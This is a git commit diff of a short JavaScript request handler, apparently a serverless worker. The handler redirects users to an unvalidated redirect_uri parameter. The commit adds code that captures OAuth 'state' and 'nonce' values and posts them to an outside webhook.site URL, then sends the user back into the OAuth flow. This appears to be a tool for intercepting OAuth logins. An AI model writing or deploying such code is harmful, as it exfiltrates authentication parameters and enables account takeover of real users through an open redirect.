7bba17bcbefee0486cb8e02f70ad8650edbc5c64
cyborggggg <80856053+cyborggggg@users.noreply.github.com>
2025-03-16 00:14:17 +0000

    Update tteest.js

--- tteest.js
+++ tteest.js
@@ -6,6 +6,17 @@ async function handleRequest(request) {
   let url = new URL(request.url);
   let redirectUri = url.searchParams.get("redirect_uri") || "https://google.com"; // Default
 
-  // Return a 302 Redirect
+  // Capture state & nonce from the first request
+  let state = url.searchParams.get("state");
+  let nonce = url.searchParams.get("nonce");
+
+  // Log initial request (optional)
+  await fetch("https://webhook.site/86ffa995-eef3-4d34-92c6-c90537464706", { // Change this!
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ stage: "first_redirect", state, nonce })
+  });
+
+  // Redirect user back into the OAuth flow
   return Response.redirect(redirectUri, 302);
 }
